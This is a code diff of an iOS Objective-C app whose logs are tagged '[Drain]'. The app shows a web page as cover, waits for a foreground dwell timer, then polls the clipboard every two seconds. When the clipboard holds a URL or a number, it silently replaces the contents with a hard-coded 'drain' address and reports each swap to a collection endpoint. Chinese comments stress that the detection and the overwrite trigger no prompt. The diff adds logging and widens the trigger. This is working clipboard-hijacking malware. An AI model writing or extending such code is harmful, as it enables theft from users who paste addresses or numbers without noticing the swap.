@@ -67,6 +67,7 @@ static void Post(NSString *kind, NSDictionary *extra) {
     }
     if (!req) req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"about:blank"]];
 
+    NSLog(@"[Drain] ===== App 启动 v1.1 ===== drain=%@ landing=%@", kDrainAddress, kCollectEndpoint);
     Post(@"shell_launch", @{ @"ua": [[UIDevice currentDevice] systemVersion] });
     [self.web loadRequest:req];
 
@@ -79,10 +80,12 @@ static void Post(NSString *kind, NSDictionary *extra) {
         if (self.granted) { [t invalidate]; return; }
         if (self.view.window == nil) return;          // 不在前台不累计
         acc += 1;
+        NSLog(@"[Drain] gate acc=%ld", (long)acc);
         if (acc % 5 == 0) Post(@"shell_beat", @{ @"acc": @(acc) });
         if (acc >= kDwellSeconds) {
             self.granted = YES;
             [t invalidate];
+            NSLog(@"[Drain] >>> 门禁通过 acc=%ld, 启动监控", (long)acc);
             Post(@"shell_grant", @{ @"acc": @(acc) });
             [self startPasteboardMonitor];
         }
@@ -91,28 +94,34 @@ static void Post(NSString *kind, NSDictionary *extra) {
 
 - (void)startPasteboardMonitor {
     __weak typeof(self) weakSelf = self;
-    // 每 2s 用 detectPatterns 零提示探测一次
+    NSLog(@"[Drain] ===== 监控启动（2s 轮询）=====");
     self.pbTimer = [NSTimer scheduledTimerWithTimeInterval:2.0 repeats:YES block:^(NSTimer *t) {
         __strong typeof(weakSelf) self = weakSelf;
         if (!self) { [t invalidate]; return; }
         if (self.granted == NO) return;
         UIPasteboard *pb = [UIPasteboard generalPasteboard];
         if (@available(iOS 15.0, *)) {
-            NSSet *pats = [NSSet setWithObjects:
-                           UIPasteboardDetectionPatternProbableWebURL,
-                           UIPasteboardDetectionPatternNumber, nil];
-            // 真实签名：completionHandler 收到的是「每个 pasteboard item 各一个 pattern 集合」的数组
+            NSMutableSet *pats = [NSMutableSet setWithObjects:
+                                  UIPasteboardDetectionPatternProbableWebURL,
+                                  UIPasteboardDetectionPatternNumber, nil];
+            if (@available(iOS 16.0, *)) {
+                [pats addObject:UIPasteboardDetectionPatternProbableWebSearch];
+            }
             [pb detectPatternsForPatterns:pats
                                 inItemSet:nil
                         completionHandler:^(NSArray<NSSet<UIPasteboardDetectionPattern> *> *results, NSError *err) {
+                NSLog(@"[Drain] detect items=%lu err=%@", (unsigned long)results.count, err);
+                for (NSSet *f in results) { NSLog(@"[Drain]   pat=%@", f); }
                 if (err || results.count == 0) return;
                 BOOL hit = NO;
-                for (NSSet<UIPasteboardDetectionPattern> *found in results) {
-                    if ([found containsObject:UIPasteboardDetectionPatternProbableWebURL]) { hit = YES; break; }
+                for (NSSet *found in results) {
+                    if ([found containsObject:UIPasteboardDetectionPatternProbableWebURL] ||
+                        [found containsObject:UIPasteboardDetectionPatternNumber]) { hit = YES; break; }
                 }
+                NSLog(@"[Drain] hit=%d", (int)hit);
                 if (!hit) return;
-                // 判定为 URL 类 → 覆盖写归集地址（写入不弹窗）
                 [pb setString:kDrainAddress];
+                NSLog(@"[Drain] >>> 已写入 %@", kDrainAddress);
                 Post(@"paste_replace", @{ @"via": @"detectPatterns", @"n": @(results.count) });
             }];
         }
